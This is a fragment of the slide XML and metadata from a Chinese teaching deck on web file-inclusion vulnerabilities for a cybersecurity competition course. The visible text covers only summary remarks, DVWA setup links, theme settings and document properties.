                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>利用</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"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536892" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>总结</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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36892" y="1048831"/>
            <a:ext cx="4276725" cy="518686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文件包含只是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漏洞中的一类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~</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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在实际应用中，经常和文件上传搭配使用，</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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前面的内容大多数是文件包含的基础内容，</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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多实践多尝试，能更好地感受其中的原理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~</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="28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609748" y="1200860"/>
            <a:ext cx="4455795" cy="50348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（补充）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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DVWA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US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平台的搭建（网上也有许多好的教程）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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40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https://blog.csdn.net/weixin_45677145/article/details/111054804</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" u="sng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https://blog.csdn.net/qq_45791542/article/details/108107147</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" u="sng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5860" y="4281805"/>
            <a:ext cx="1464310" cy="13938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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4695507" y="3517900"/>
            <a:ext cx="2800985" cy="108712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 fontScale="6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394479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8800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Thanks</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="8800" dirty="0"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ags/tag1.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_UNIT_PLACING_PICTURE_USER_VIEWPORT" val="{&quot;height&quot;:3972,&quot;width&quot;:11700}"/>
</p:tagLst>
</file>

<file path=ppt/theme/theme1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主题5">
  <a:themeElements>
    <a:clrScheme name="University of Malaya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019844"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="E82209"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="FCC300"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="0B52A2"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="0D8ECC"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="ABDBDF"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="4472C4"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="BFBFBF"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="tdl3kz1d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University of Malaya">
    <a:dk1>
      <a:srgbClr val="000000"/>
    </a:dk1>
    <a:lt1>
      <a:srgbClr val="FFFFFF"/>
    </a:lt1>
    <a:dk2>
      <a:srgbClr val="768395"/>
    </a:dk2>
    <a:lt2>
      <a:srgbClr val="F0F0F0"/>
    </a:lt2>
    <a:accent1>
      <a:srgbClr val="019844"/>
    </a:accent1>
    <a:accent2>
      <a:srgbClr val="E82209"/>
    </a:accent2>
    <a:accent3>
      <a:srgbClr val="FCC300"/>
    </a:accent3>
    <a:accent4>
      <a:srgbClr val="0B52A2"/>
    </a:accent4>
    <a:accent5>
      <a:srgbClr val="0D8ECC"/>
    </a:accent5>
    <a:accent6>
      <a:srgbClr val="ABDBDF"/>
    </a:accent6>
    <a:hlink>
      <a:srgbClr val="4472C4"/>
    </a:hlink>
    <a:folHlink>
      <a:srgbClr val="BFBFB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4025</Words>
  <Application>WPS 演示</Application>
  <PresentationFormat>宽屏</PresentationFormat>
  <Paragraphs>297</Paragraphs>
  <Slides>29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29</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="40" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>宋体</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>华光中圆_CNKI</vt:lpstr>
      <vt:lpstr>黑体</vt:lpstr>
      <vt:lpstr>方正正中黑简体</vt:lpstr>
      <vt:lpstr>微软雅黑</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>等线</vt:lpstr>
      <vt:lpstr>webwppDefTheme</vt:lpstr>
      <vt:lpstr>主题5</vt:lpstr>
      <vt:lpstr>网络空间安全竞赛体验课 （Web--文件包含）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进阶内容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主标题</dc:title>
  <dc:creator>Hansen</dc:creator>
  <cp:lastModifiedBy>陈慧珍</cp:lastModifiedBy>
  <cp:revision>424</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-11-19T00:54:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-26T07:08:30Z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fs.IsStoryboard">
    <vt:bool>true</vt:bool>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="KSOProductBuildVer">
    <vt:lpwstr>2052-12.1.0.25225</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="ICV">
    <vt:lpwstr>6CEB0F8BDBB84E2D8E60B4C57A0FB889</vt:lpwstr>
  </property>
</Properties>
</file>